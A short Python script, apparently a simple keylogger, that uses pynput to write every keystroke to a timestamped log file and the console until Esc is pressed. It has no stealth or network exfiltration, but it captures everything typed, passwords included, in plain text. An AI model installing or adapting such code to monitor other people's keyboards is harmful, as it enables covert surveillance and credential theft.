from pynput import keyboard
import logging
import zoneinfo # added since python 3.9
import datetime

logging.Formatter.converter = lambda *args: datetime.datetime.now(tz=zoneinfo.ZoneInfo("Europe/Moscow")).timetuple()
handlers = [
  logging.FileHandler(datetime.datetime.now().strftime('logs/log_%Y-%m-%d_%H-%M-%S.log')),
  logging.StreamHandler(),
]
logging.basicConfig(
  level=logging.INFO,
  format='[%(asctime)s] %(levelname)s [%(name)s] Key pressed %(message)s',
  datefmt='%Y-%m-%d %H:%M:%S %Z',
  handlers=handlers
)
logger = logging.getLogger(__name__)

def on_press(key):
  try:
    logger.info(f'{key.char}')
  except AttributeError:
    logger.info(f'{key}')

def on_release(key):
  #logger.info(f'Key {key} released')
  if key == keyboard.Key.esc:
    raise StopIteration
    #return False

def main():
  try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
      listener.join()
  except:
    logger.info('EXIT')
    exit()

if __name__ == '__main__':
  main()
